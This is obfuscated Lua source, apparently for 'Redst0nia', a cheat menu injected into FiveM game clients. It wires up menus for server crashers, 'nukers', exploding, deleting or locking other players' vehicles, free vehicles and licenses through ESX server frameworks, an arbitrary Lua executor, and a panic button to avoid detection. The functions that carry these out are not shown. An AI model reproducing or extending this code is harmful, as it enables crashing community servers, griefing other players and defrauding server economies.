iJ:Add(Z2epByaArTg2)
eMRu:BindMenuToItem(Z2epByaArTg2, U3spu4gXA_V)
local xl3pnqp6jDFZsiB = NativeUI.CreateItem("Exterior Tuning", "")
xl3pnqp6jDFZsiB:SetRightBadge(BadgeStyle.Lock)
_CNAkmyXEwa6k6oiwBUHg:AddItem(xl3pnqp6jDFZsiB)
local HLy4 = NativeUI.CreateItem("Performance Tuning", "")
HLy4:SetRightBadge(BadgeStyle.Lock)
_CNAkmyXEwa6k6oiwBUHg:AddItem(HLy4)
local ZYF4XG2gon = NativeUI.CreateItem("Change vehicle license plate", "")
ZYF4XG2gon:SetRightBadge(BadgeStyle.Tick)
_CNAkmyXEwa6k6oiwBUHg:AddItem(ZYF4XG2gon)
local ygEatu1FrRicw = NativeUI.CreateCheckboxItem("Rainbow vehicle paint", false, "")
_CNAkmyXEwa6k6oiwBUHg:AddItem(ygEatu1FrRicw)
local aO4LlS_C = NativeUI.CreateCheckboxItem("Rainbow vehicle neons & headlights", false, "")
_CNAkmyXEwa6k6oiwBUHg:AddItem(aO4LlS_C)
_CNAkmyXEwa6k6oiwBUHg.OnItemSelect = function(h3wrSlIa_oKzDcP, v, tz5g77is8bCNAD5SPNi)
    if v == ZYF4XG2gon then
        QpaGPqHEnx_()
    end
end
_CNAkmyXEwa6k6oiwBUHg.OnCheckboxChange = function(FYLk6xEO3_0Ui2ufK6I, q, VEOStalQFyP)
    if q == ygEatu1FrRicw then
        rainbStatus = VEOStalQFyP
        local CUfSjFavQC
        if rainbStatus == true then
            CUfSjFavQC = "~g~enabled"
        else
            CUfSjFavQC = "~r~disabled"
        end
        CahvwB3vGb("Vehicle rainbow paint is now " .. CUfSjFavQC .. "~s~.")
    elseif q == aO4LlS_C then
        rainbBNStatus = VEOStalQFyP
        local iqR
        if rainbBNStatus == true then
            iqR = "~g~enabled"
        else
            iqR = "~r~disabled"
        end
        CahvwB3vGb("Vehicle rainbow on neon & headlight is now " .. iqR .. "~s~.")
    end
end
local X9zZQrT = NativeUI.CreateItem("Sideflip", "")
Z2epByaArTg2:AddItem(X9zZQrT)
local lu = NativeUI.CreateItem("Front Flip", "")
Z2epByaArTg2:AddItem(lu)
local UXW9SWcgagRT75 = NativeUI.CreateItem("Back Flip", "")
Z2epByaArTg2:AddItem(UXW9SWcgagRT75)
Z2epByaArTg2.OnItemSelect = function(j6vL2r27iYkiAQXY, epFRAuX3nCP3kUnWTeU, OYSbe5)
    if epFRAuX3nCP3kUnWTeU == X9zZQrT then
        Nu2cAusL()
    elseif epFRAuX3nCP3kUnWTeU == lu then
        GIJpTR80GNE8Bfxsnkenu()
    elseif epFRAuX3nCP3kUnWTeU == UXW9SWcgagRT75 then
        xEBBXSHGE()
    end
end
local oBVjw1g3bQXpt5CVir = NativeUI.CreateItem("Vehicle Boost", "")
oBVjw1g3bQXpt5CVir:SetRightBadge(BadgeStyle.Crown)
eMRu:AddItem(oBVjw1g3bQXpt5CVir)
local rCAbMVvW =
    NativeUI.CreateMenu("Redst0nia " .. HrVTH5ewMKL1Pj, "~w~Vehicle Boost", Ylr442mzV7_qo7glKLZr, dL3gLfg8OIwljjM_9)
rCAbMVvW:SetBannerRectangle(aW60GlTo7turR, true)
iJ:Add(rCAbMVvW)
eMRu:BindMenuToItem(rCAbMVvW, oBVjw1g3bQXpt5CVir)
local tDgfwis = 1
local PLTNe2iEhJBd = {}
for i = 0, 200 do
    PLTNe2iEhJBd[i] = i
end
local Cb =
    NativeUI.CreateSliderProgressItem("Engine Power Multiplier", PLTNe2iEhJBd, 0, "Give your vehicle more power", 1)
rCAbMVvW:AddItem(Cb)
rCAbMVvW.OnSliderChange = function(TPDoEDNhur0FQIPKxke, ffwOp, LFUXjjJ)
    if ffwOp == Cb then
        tDgfwis = ffwOp:IndexToItem(LFUXjjJ)
        local BHIR4F4_6hgafoqePxC2e = GetVehiclePedIsIn(GetPlayerPed(-1), true)
        SetVehicleEnginePowerMultiplier(BHIR4F4_6hgafoqePxC2e, tDgfwis * 30.0)
    end
end
local MmzRhaGJPhYbdhs = NativeUI.CreateItem("Global Vehicle Trolls", "")
MmzRhaGJPhYbdhs:SetRightBadge(BadgeStyle.Alert)
eMRu:AddItem(MmzRhaGJPhYbdhs)
local I7F5hLkD26maC8adho_64 =
    NativeUI.CreateMenu(
    "Redst0nia " .. HrVTH5ewMKL1Pj,
    "~w~Global Vehicle Trolls",
    Ylr442mzV7_qo7glKLZr,
    dL3gLfg8OIwljjM_9
)
I7F5hLkD26maC8adho_64:SetBannerRectangle(aW60GlTo7turR, true)
iJ:Add(I7F5hLkD26maC8adho_64)
eMRu:BindMenuToItem(I7F5hLkD26maC8adho_64, MmzRhaGJPhYbdhs)
local XrdUmhIODXhMqlLjnuRy = NativeUI.CreateItem("Burger nearest vehicles", "Note : BORGAR")
I7F5hLkD26maC8adho_64:AddItem(XrdUmhIODXhMqlLjnuRy)
local U5hKJZS4 =
    NativeUI.CreateCheckboxItem("EMP nearest vehicles", false, "Note : Disables all cars around you, engine blow")
I7F5hLkD26maC8adho_64:AddItem(U5hKJZS4)
local _k7zp8SBqeXg6a =
    NativeUI.CreateCheckboxItem("Delete nearest vehicles", false, "Note : Well, deletes nearest vehicles")
I7F5hLkD26maC8adho_64:AddItem(_k7zp8SBqeXg6a)
local crT =
    NativeUI.CreateCheckboxItem("Launch nearest vehicles", false, "Note : Launching cars straight up to the sky")
I7F5hLkD26maC8adho_64:AddItem(crT)
local pj0iUbVzbN8ev =
    NativeUI.CreateCheckboxItem("Explode nearest vehicles", false, "Note : Explodes all vehicles around you")
I7F5hLkD26maC8adho_64:AddItem(pj0iUbVzbN8ev)
local Be03X3F2wGbLp4DnE =
    NativeUI.CreateCheckboxItem("Lock All Nearby Vehicles", false, "Note : Lock all nearby vehicles")
I7F5hLkD26maC8adho_64:AddItem(Be03X3F2wGbLp4DnE)
I7F5hLkD26maC8adho_64.OnItemSelect = function(L3jDKilchG, xhULogIUk5Maxn, doR3D9NwNEn2pw)
    if xhULogIUk5Maxn == XrdUmhIODXhMqlLjnuRy then
        A1cfgejMd94j_AIO1p0()
    end
end
I7F5hLkD26maC8adho_64.OnCheckboxChange = function(Nh8TTziN, o6fEQ56c1_a6Hi, Tue)
    if o6fEQ56c1_a6Hi == U5hKJZS4 then
        EMPStatus = Tue
        local dK3BF
        if EMPStatus == true then
            dK3BF = "~g~enabled"
        else
            dK3BF = "~r~disabled"
        end
        CahvwB3vGb("EMP Status is now " .. dK3BF .. "~s~.")
    elseif o6fEQ56c1_a6Hi == _k7zp8SBqeXg6a then
        DelNStatus = Tue
        local HgsSL5
        if DelNStatus == true then
            HgsSL5 = "~g~enabled"
        else
            HgsSL5 = "~r~disabled"
        end
        CahvwB3vGb("Delete cars status is now " .. HgsSL5 .. "~s~.")
    elseif o6fEQ56c1_a6Hi == crT then
        LaunchStatus = Tue
        local LGZ
        if LaunchStatus == true then
            LGZ = "~g~enabled"
        else
            LGZ = "~r~disabled"
        end
        CahvwB3vGb("Launching cars status is now " .. LGZ .. "~s~.")
    elseif o6fEQ56c1_a6Hi == pj0iUbVzbN8ev then
        ExplodeStatus = Tue
        local MwQ7Q
        if ExplodeStatus == true then
            MwQ7Q = "~g~enabled"
        else
            MwQ7Q = "~r~disabled"
        end
        CahvwB3vGb("Exploding cars status is now " .. MwQ7Q .. "~s~.")
    elseif o6fEQ56c1_a6Hi == Be03X3F2wGbLp4DnE then
        LockvehStatus = Tue
        local QHTmNgH
        if LockvehStatus == true then
            QHTmNgH = "~g~enabled"
        else
            QHTmNgH = "~r~disabled"
        end
        CahvwB3vGb("Locking nearest cars is now " .. QHTmNgH .. "~s~.")
    end
end
local PmRSjqk6Tu2 = NativeUI.CreateItem("Modded Vehicles", "Spawn Modded Vehicles")
eMRu:AddItem(PmRSjqk6Tu2)
PmRSjqk6Tu2:SetRightBadge(BadgeStyle.ArrowR)
local eHACg0OdDpSCsQAEu =
    NativeUI.CreateMenu("Redst0nia " .. HrVTH5ewMKL1Pj, "~w~Modded Vehicles", Ylr442mzV7_qo7glKLZr, dL3gLfg8OIwljjM_9)
eHACg0OdDpSCsQAEu:SetBannerRectangle(aW60GlTo7turR, true)
iJ:Add(eHACg0OdDpSCsQAEu)
eMRu:BindMenuToItem(eHACg0OdDpSCsQAEu, PmRSjqk6Tu2)
local aSbuwU = NativeUI.CreateItem("Penis Flatbed", "Note: Still under work")
eHACg0OdDpSCsQAEu:AddItem(aSbuwU)
eHACg0OdDpSCsQAEu.OnItemSelect = function(bw, GOxZZOxgLSfr3, _n6BkmLuPT4ZAG)
    if GOxZZOxgLSfr3 == aSbuwU then
        JDpTz3ykUoTwq7LUy4KFo()
    end
end
local niI3GAZboinnZ7 = NativeUI.CreateItem("Train menu", "Note : Experimental")
eMRu:AddItem(niI3GAZboinnZ7)
niI3GAZboinnZ7:SetRightBadge(BadgeStyle.ArrowR)
local RoBhYFHoAQnsIr =
    NativeUI.CreateMenu("Redst0nia " .. HrVTH5ewMKL1Pj, "~w~Train Menu", Ylr442mzV7_qo7glKLZr, dL3gLfg8OIwljjM_9)
RoBhYFHoAQnsIr:SetBannerRectangle(aW60GlTo7turR, true)
iJ:Add(RoBhYFHoAQnsIr)
eMRu:BindMenuToItem(RoBhYFHoAQnsIr, niI3GAZboinnZ7)
local ZWElvueFkRxtGHXilIz5O = NativeUI.CreateItem("Spawn a train", "")
RoBhYFHoAQnsIr:AddItem(ZWElvueFkRxtGHXilIz5O)
local P2qhdOowKOWlYG1KG2KXE = NativeUI.CreateItem("Delete the train", "")
RoBhYFHoAQnsIr:AddItem(P2qhdOowKOWlYG1KG2KXE)
local qfq4i = 0
local csKVp = {}
for i = 0, 50 do
    csKVp[i] = i
end
local b98gmn = NativeUI.CreateSliderProgressItem("Train Speed", csKVp, 0, "Change train speed", 1)
RoBhYFHoAQnsIr:AddItem(b98gmn)
RoBhYFHoAQnsIr.OnItemSelect = function(jr, EsBjzRQ, nJiEWt)
    if EsBjzRQ == ZWElvueFkRxtGHXilIz5O then
        Z()
    elseif EsBjzRQ == P2qhdOowKOWlYG1KG2KXE then
        D1svT5dhucZLJiRMXU()
    end
end
RoBhYFHoAQnsIr.OnSliderChange = function(MZoMBhg, nORwo4_HWYUU, MoVmIqeghD5QvDhAnh0)
    if nORwo4_HWYUU == b98gmn then
        qfq4i = nORwo4_HWYUU:IndexToItem(MoVmIqeghD5QvDhAnh0)
        local p5af = GetVehiclePedIsIn(GetPlayerPed(-1), true)
        if IsPedInAnyTrain(GetPlayerPed(-1)) then
            SetTrainCruiseSpeed(p5af, qfq4i * 100.0)
        else
            CahvwB3vGb("Not in a ~r~train!")
        end
    end
end
local UQywbfqW9R2RR = NativeUI.CreateItem("Spawn a vehicle", "")
eMRu:AddItem(UQywbfqW9R2RR)
local ugFam1lfTmAC4U1Ih = NativeUI.CreateItem("Delete your vehicle", "")
eMRu:AddItem(ugFam1lfTmAC4U1Ih)
local xviW = NativeUI.CreateItem("Repair your vehicle", "")
eMRu:AddItem(xviW)
xviW:SetRightBadge(BadgeStyle.Car)
local kh = NativeUI.CreateItem("Repair your vehicle engine", "")
eMRu:AddItem(kh)
local Rh = NativeUI.CreateItem("Flip your vehicle", "")
eMRu:AddItem(Rh)
local gbbzmJ7kfhNFV2 = NativeUI.CreateItem("Max tune your vehicle", "")
eMRu:AddItem(gbbzmJ7kfhNFV2)
eMRu.OnItemSelect = function(HbtK, ij4Nj7GReq, X9FnP)
    if ij4Nj7GReq == UQywbfqW9R2RR then
        SzFf30gwGdZtQ0Q()
    elseif ij4Nj7GReq == ugFam1lfTmAC4U1Ih then
        aJo0MMIDr8dH08EB(GetVehiclePedIsUsing(PlayerPedId(-1)))
    elseif ij4Nj7GReq == xviW then
        rdPVF()
    elseif ij4Nj7GReq == kh then
        uADamocj6YeoW()
    elseif ij4Nj7GReq == Rh then
        kixHTv4S1Oelge()
    elseif ij4Nj7GReq == gbbzmJ7kfhNFV2 then
        tYNChyj()
    end
end
local djrlbK0ANTht7NXcT8rgT = NativeUI.CreateCheckboxItem("Vehicle Godmode", false, "")
eMRu:AddItem(djrlbK0ANTht7NXcT8rgT)
local wP20EPEjR7s = NativeUI.CreateCheckboxItem("Vehicle Boost", false, "Note : Use CTRL & SHIFT")
eMRu:AddItem(wP20EPEjR7s)
local H2ym3TgT =
    NativeUI.CreateCheckboxItem("Unlock All Nearby Vehicles", false, "Note : Unlocks all nearby vehicles for you")
eMRu:AddItem(H2ym3TgT)
eMRu.OnCheckboxChange = function(RV, Uk6McwtuRfydtU, h)
    if Uk6McwtuRfydtU == djrlbK0ANTht7NXcT8rgT then
        q0p1IY1Ga4Vi6s5HA = h
        CahvwB3vGb("Vehicle godmode is now " .. T50GZbtxYdzNhvVL(q0p1IY1Ga4Vi6s5HA) .. "~s~.")
    elseif Uk6McwtuRfydtU == wP20EPEjR7s then
        VEW50tBUqyGeO2O = h
        CahvwB3vGb("Vehicle boost is now " .. T50GZbtxYdzNhvVL(VEW50tBUqyGeO2O) .. "~s~.")
        CahvwB3vGb("Use SHIFT & CTRL to boost or brake~s~.")
    elseif Uk6McwtuRfydtU == H2ym3TgT then
        UnlockVehStatus = h
        CahvwB3vGb("Unlocking all nearby cars is now " .. T50GZbtxYdzNhvVL(UnlockVehStatus) .. "~s~.")
    end
end
local J3npAzrWkvOUSAuAU = iJ:AddSubMenu(pcwCmJS, "Teleport Menu", "", true, true, "~w~Teleport Menu")
local DNEqGpArcKqbvsyZ5 = NativeUI.CreateItem("Teleport to waypoint", "")
J3npAzrWkvOUSAuAU.SubMenu:AddItem(DNEqGpArcKqbvsyZ5)
local Fo1ljD_vW6Iy94_ = NativeUI.CreateItem("Teleport to nearest vehicle", "")
J3npAzrWkvOUSAuAU.SubMenu:AddItem(Fo1ljD_vW6Iy94_)
local OtcFGxIJA = NativeUI.CreateItem("Draw a blip on the map", "")
J3npAzrWkvOUSAuAU.SubMenu:AddItem(OtcFGxIJA)
local S1puRo = NativeUI.CreateCheckboxItem("Show coords", false, "")
J3npAzrWkvOUSAuAU.SubMenu:AddItem(S1puRo)
J3npAzrWkvOUSAuAU.SubMenu.OnItemSelect = function(kOxY9mLdROB0ejNXXjP, b54Ig, oxrIkiTfSwKF_Th_Q)
    if b54Ig == DNEqGpArcKqbvsyZ5 then
        Fqu29XXtIicnWVhoKTGI()
    elseif b54Ig == Fo1ljD_vW6Iy94_ then
        iRm5K3crpG_NlT0m()
    elseif b54Ig == OtcFGxIJA then
        i8TdCb4qEaGoIfe1()
    end
end
J3npAzrWkvOUSAuAU.SubMenu.OnCheckboxChange = function(HdBtva8TkzETr5aVhu_T5, nOcj2J, cCXmq)
    if nOcj2J == S1puRo then
        coordsStatus = cCXmq
        local pv9boc2X0TzJ9
        if coordsStatus == true then
            pv9boc2X0TzJ9 = "~g~enabled"
        else
            pv9boc2X0TzJ9 = "~r~disabled"
        end
        CahvwB3vGb("Player coords are now " .. pv9boc2X0TzJ9 .. "~s~.")
    end
end
local POVDIo8 = iJ:AddSubMenu(pcwCmJS, "Destroyer Menu", "", true, true, "~w~Destroyer Menu")
local y0xWioVMTodL = NativeUI.CreateItem("Old Nuker", "Note: Classic nuker well known")
y0xWioVMTodL:SetRightBadge(BadgeStyle.Alert)
POVDIo8.SubMenu:AddItem(y0xWioVMTodL)
local fjKG_EtGMGrslnBs0 = NativeUI.CreateItem("Ramp Everything", "")
fjKG_EtGMGrslnBs0:SetRightBadge(BadgeStyle.Alert)
POVDIo8.SubMenu:AddItem(fjKG_EtGMGrslnBs0)
local hFhdEWrkMKtqPrXzvROf = NativeUI.CreateItem("New Nuker", "Note: You probably want to click it few times")
hFhdEWrkMKtqPrXzvROf:SetRightBadge(BadgeStyle.Tick)
POVDIo8.SubMenu:AddItem(hFhdEWrkMKtqPrXzvROf)
local L4vrDvwsud3E = NativeUI.CreateItem("Server Crasher 2.0", "Note: It's not very stable, you've been advised")
L4vrDvwsud3E:SetRightBadge(BadgeStyle.Tick)
POVDIo8.SubMenu:AddItem(L4vrDvwsud3E)
local OZZs4OnPnYOUAfsmT =
    NativeUI.CreateItem("Trigger Server Crasher", "Note: It's not very stable, you've been advised")
OZZs4OnPnYOUAfsmT:SetRightBadge(BadgeStyle.Tick)
POVDIo8.SubMenu:AddItem(OZZs4OnPnYOUAfsmT)
local G6GJYCuWGp3c9Me = NativeUI.CreateItem("Ramp 2.0", "Note: This ramping + something special :pepega:")
G6GJYCuWGp3c9Me:SetRightBadge(BadgeStyle.Tick)
POVDIo8.SubMenu:AddItem(G6GJYCuWGp3c9Me)
POVDIo8.SubMenu.OnItemSelect = function(vSZdN, RA3IBx_, sBuPRecLAUmW)
    if RA3IBx_ == y0xWioVMTodL then
        bEKhuUmIxS6XD()
        CahvwB3vGb("Old nuker executed~s~.")
    elseif RA3IBx_ == fjKG_EtGMGrslnBs0 then
        yIwVu2IktHAjxNrQ21W()
        CahvwB3vGb("Ramped everything~s~.")
    elseif RA3IBx_ == hFhdEWrkMKtqPrXzvROf then
        cGLGr0RqmPAd3ls()
        CahvwB3vGb("New nuker executed~s~.")
    elseif RA3IBx_ == L4vrDvwsud3E then
        CrasherV2()
        CahvwB3vGb("Crasher 2.0 executed~s~.")
    elseif RA3IBx_ == OZZs4OnPnYOUAfsmT then
        TrigCrash()
        CahvwB3vGb("Crasher 2.0 executed~s~.")
    elseif RA3IBx_ == G6GJYCuWGp3c9Me then
        Ramp2()
        CahvwB3vGb("Ramped everything~s~.")
    end
end
local function gH77Tk9tYBeAUyb()
    local HycTKaJpdasxf7p7gR = kR3tkcBRzWGoBkSE("Type custom code to execute ", "", 200)
    local gwmsJtUcc7SC1LjMDi = load(HycTKaJpdasxf7p7gR)
    local UdbpqYXB0FcnpKBPn7fK4, svOqB5S2j1p98OL = pcall(gwmsJtUcc7SC1LjMDi)
    if (UdbpqYXB0FcnpKBPn7fK4) then
        CahvwB3vGb("Code was successfully executed!")
    else
        CahvwB3vGb("There was an error in your code, printed it out in F8 Console")
        print("Redst0nia Custom Execution Error: ^1" .. string.upper(svOqB5S2j1p98OL))
    end
end
local tV5rLt9MhHsq18 = NativeUI.CreateItem("Lua Executor", "")
pcwCmJS:AddItem(tV5rLt9MhHsq18)
local Qkmukfw =
    NativeUI.CreateMenu("Redst0nia " .. HrVTH5ewMKL1Pj, "~w~Lua Executor", Ylr442mzV7_qo7glKLZr, dL3gLfg8OIwljjM_9)
Qkmukfw:SetBannerRectangle(aW60GlTo7turR, true)
iJ:Add(Qkmukfw)
pcwCmJS:BindMenuToItem(Qkmukfw, tV5rLt9MhHsq18)
local gNVAjPTvr3OF = nil
local d4 = nil
local eWV6lvsEe35HCU = nil
if gzhXdn5rXT132aD["es_extended"] then
    gNVAjPTvr3OF = iJ:AddSubMenu(Qkmukfw, "ESX Options", "", true, true, "~w~ESX Options")
    local DY5 = NativeUI.CreateItem("Get all licenses", "Note : Requires esx_license")
    if not gzhXdn5rXT132aD["esx_license"] then
        DY5:RightLabel("~r~esx_license")
        DY5:SetRightBadge(BadgeStyle.Lock)
    end
    gNVAjPTvr3OF.SubMenu:AddItem(DY5)
    local I96lVzRo41HYqj = NativeUI.CreateItem("Get vehicle for free", "Note : Requires esx_vehicleshop")
    if not gzhXdn5rXT132aD["esx_vehicleshop"] then
        I96lVzRo41HYqj:RightLabel("~r~esx_vehicleshop")
        I96lVzRo41HYqj:SetRightBadge(BadgeStyle.Lock)
    end
    gNVAjPTvr3OF.SubMenu:AddItem(I96lVzRo41HYqj)
    gNVAjPTvr3OF.SubMenu.OnItemSelect = function(od5mQ45UMzYp, uMoJ0f21DNUwXp_s0CPd, Eg0kWc)
        if uMoJ0f21DNUwXp_s0CPd == DY5 then
            DMVF(PlayerId())
        elseif uMoJ0f21DNUwXp_s0CPd == I96lVzRo41HYqj then
            BCFF()
        end
    end
else
    gNVAjPTvr3OF = NativeUI.CreateItem("ESX Options", "")
    gNVAjPTvr3OF:RightLabel("~r~es_extended")
    gNVAjPTvr3OF:SetRightBadge(BadgeStyle.Lock)
    Qkmukfw:AddItem(gNVAjPTvr3OF)
end
if gzhXdn5rXT132aD["vrp"] then
    d4 = iJ:AddSubMenu(Qkmukfw, "VRP Options", "", true, true, "~w~VRP Options")
else
    d4 = NativeUI.CreateItem("VRP Options", "")
    d4:RightLabel("~r~vrp")
    d4:SetRightBadge(BadgeStyle.Lock)
    Qkmukfw:AddItem(d4)
end
local Vq9lW = NativeUI.CreateItem("Execute Custom LUA", "Type LUA code and execute it")
Qkmukfw:AddItem(Vq9lW)
Qkmukfw.OnItemSelect = function(gGEWkXA82R7dwzk3wZF, PZ, bfvel)
    if PZ == Vq9lW then
        gH77Tk9tYBeAUyb()
    elseif PZ == gNVAjPTvr3OF then
        if not gzhXdn5rXT132aD["es_extended"] then
            CahvwB3vGb("This server does ~r~not~s~ have ~b~es_extended~s~!")
        end
    elseif PZ == d4 then
        if not gzhXdn5rXT132aD["vrp"] then
            CahvwB3vGb("This server does ~r~not~s~ have ~b~vrp~s~!")
        end
    end
end
local WVc6i0DVtb44YIGh4Mqc = iJ:AddSubMenu(pcwCmJS, "Fun Stuff", "", true, true, "~w~Fun Stuff")
local QhY4SgCJ8pI = NativeUI.CreateItem("RC Car", "Use the RC Car")
WVc6i0DVtb44YIGh4Mqc.SubMenu:AddItem(QhY4SgCJ8pI)
freecamBtn = NativeUI.CreateItem("Free Camera", "Use the Free Cam mode")
WVc6i0DVtb44YIGh4Mqc.SubMenu:AddItem(freecamBtn)
local ic = NativeUI.CreateCheckboxItem("Pepe Mode", false, "Aka LSD Mode :)")
WVc6i0DVtb44YIGh4Mqc.SubMenu:AddItem(ic)
WVc6i0DVtb44YIGh4Mqc.SubMenu.OnItemSelect = function(osbouRxjyUpu, y0w2GR, nur)
    if y0w2GR == QhY4SgCJ8pI then
        CahvwB3vGb("RC Car Activated.")
        TTf.Start()
    elseif y0w2GR == freecamBtn then
        CahvwB3vGb("Free Camera ~g~enabled~s~.")
        if iJ:IsAnyMenuOpen() then
            iJ:CloseAllMenus()
            CinematicCam()
        end
    end
end
WVc6i0DVtb44YIGh4Mqc.SubMenu.OnCheckboxChange = function(WLN7Ng6_rO, RUt, XFsZuvt)
    if RUt == ic then
        pepeModeStatus = XFsZuvt
        CahvwB3vGb("Pepe Mode is now " .. T50GZbtxYdzNhvVL(pepeModeStatus) .. "~s~.")
    end
end
local PRs2uHQ = iJ:AddSubMenu(pcwCmJS, "Miscellaneous", "", true, true, "~w~Miscellaneous")
local eI =
    NativeUI.CreateCheckboxItem(
    "Exclude Self - Streamer Mode",
    false,
    "Removes the censoring of your name while in ~b~Streamer Mode"
)
PRs2uHQ.SubMenu:AddItem(eI)
local QMvZ9731NgJs =
    NativeUI.CreateCheckboxItem(
    "Streamer Mode",
    false,
    "Hides other players names AND your name \n~w~Hint :\n~r~Use ~b~Exclude Self ~w~option"
)
PRs2uHQ.SubMenu:AddItem(QMvZ9731NgJs)
local gbTHw6 = NativeUI.CreateCheckboxItem("Player Blips", false, "Blips on the map")
PRs2uHQ.SubMenu:AddItem(gbTHw6)
local Tr4CzLJORgMe = NativeUI.CreateCheckboxItem("Player Name Above", false, "Player name above their head")
PRs2uHQ.SubMenu:AddItem(Tr4CzLJORgMe)
radarBtn = NativeUI.CreateCheckboxItem("Force Radar", false, "Force radar on HUD")
PRs2uHQ.SubMenu:AddItem(radarBtn)
waterBtn = NativeUI.CreateCheckboxItem("Watermark", true, "Watermark on HUD")
PRs2uHQ.SubMenu:AddItem(waterBtn)
moreinfoBtn = NativeUI.CreateCheckboxItem("More infos", true, "More infos about Redst0nia on HUD")
PRs2uHQ.SubMenu:AddItem(moreinfoBtn)
local WMARS_6r5IF = NativeUI.CreateItem("~r~Panic Button ~s~/ ~r~Disable Menu", "Unloads Redst0nia from your client.")
PRs2uHQ.SubMenu:AddItem(WMARS_6r5IF)
PRs2uHQ.SubMenu.OnCheckboxChange = function(AdzW3HB5, IhMlGYhgtZ, OJxQ)
    if IhMlGYhgtZ == QMvZ9731NgJs then
        rfuz = OJxQ
        CahvwB3vGb("Streamer Mode is now " .. T50GZbtxYdzNhvVL(rfuz) .. "~s~.")
    elseif IhMlGYhgtZ == eI then
        PuW_4RokLQaa9JQ_ = OJxQ
        CahvwB3vGb("Self Censoring is now " .. T50GZbtxYdzNhvVL(PuW_4RokLQaa9JQ_) .. "~s~.")
    elseif IhMlGYhgtZ == gbTHw6 then
        OvRzDp88nJQpyydFVL9D = OJxQ
        CahvwB3vGb("Player blips are now " .. T50GZbtxYdzNhvVL(OvRzDp88nJQpyydFVL9D) .. "~s~.")
    elseif IhMlGYhgtZ == radarBtn then
        radarStatus = OJxQ
        CahvwB3vGb("Force radar is now " .. T50GZbtxYdzNhvVL(radarStatus) .. "~s~.")
    elseif IhMlGYhgtZ == waterBtn then
        waterStatus = OJxQ
        CahvwB3vGb("Watermarks are now " .. T50GZbtxYdzNhvVL(waterStatus) .. "~s~.")
    elseif IhMlGYhgtZ == moreinfoBtn then
        moreinfoStatus = OJxQ
        CahvwB3vGb("More infos are now " .. T50GZbtxYdzNhvVL(moreinfoStatus) .. "~s~.")
    end
end
PRs2uHQ.SubMenu.OnItemSelect = function(hLZxLaTYf_, f06KCuLVlkD, i4ytawzY_)
    if f06KCuLVlkD == WMARS_6r5IF then
        CahvwB3vGb("Disabled.")
        MfoUxfed8hjNNy = false
    end
end
iJ:TotalItemsPerPage(10)
iJ:RefreshIndex()
local function DnhBjqXicq()
    Citizen.Wait(75)
    pcwCmJS:Visible(true)
    SP6M()
    PlaySoundFrontend(-1, "OK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
    A7fm3VkIXMl1PT0Gm("¦ ~w~~h~Redst0nia ~s~~y~" .. HrVTH5ewMKL1Pj .. "")
    A7fm3VkIXMl1PT0Gm("~w~Welcome ~b~" .. S2J(PlayerId()) .. " ~w~[~y~" .. GetPlayerServerId(PlayerId()) .. "~w~]")
    A7fm3VkIXMl1PT0Gm("~r~discord.gg/x8ySQcp ~w~:)")
    A7fm3VkIXMl1PT0Gm("~w~Thanks for supporting my work ~o~;3")
end
Citizen.CreateThread(
    function()
        while MfoUxfed8hjNNy do
            Citizen.Wait(1)
            if iJ:IsAnyMenuOpen() then
                iJ:ProcessMenus()
                EnableControlAction(0, OAf14Vphu3V, true)
            else
                if IsControlPressed(0, OAf14Vphu3V) then
                    DnhBjqXicq()
                end
            end
        end
    end
)

--bäärs#3150